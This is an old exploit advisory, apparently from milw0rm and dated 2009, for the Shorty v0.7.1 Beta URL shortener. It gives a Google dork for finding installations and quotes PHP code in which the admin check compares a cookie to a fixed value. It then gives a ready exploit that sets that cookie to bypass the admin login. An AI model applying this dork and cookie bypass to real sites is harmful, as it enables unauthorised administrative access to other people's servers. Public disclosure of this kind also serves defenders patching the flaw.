@@ -1,0 +1,42 @@
+Vulnerable Software
+--------------------------------------------------------------------------------
+Script: Shorty v0.7.1 Beta (maybe other versions)
+URL:http://get-shorty.com/
+Download:http://get-shorty.com/beta?force=download
+Google dork: intitle:"Shorty (Beta)"
+
+Bug
+--------------------------------------------------------------------------------
+[functions.php]
+
+45: function authenticate(){
+46:     $cookie = @$_COOKIE['snickerdoodle'];
+47:     if($cookie == "polarbears"){
+48:          //
+49:      } else {
+50:          exit("Not logged in.");
+51:      }
+52:  }
+53:
+54:  function verify(){
+55:      if(@$_COOKIE['snickerdoodle']){
+56:          $cookie = $_COOKIE['snickerdoodle'];
+57:      } else {
+58:          $cookie = '';
+59:      }
+60:      if($cookie == "polarbears"){
+61:          return 1;
+62:      } else {
+63:          return 0;
+64:      }
+65:  }
+
+[/functions.php]
+
+Exploit
+--------------------------------------------------------------------------------
+Write in the URL: javascript:document.cookie="snickerdoodle=polarbears"; in
+the admin login you want to bypass or create the cookie with you favorite
+Firefox extension.
+
+# milw0rm.com [2009-08-12]
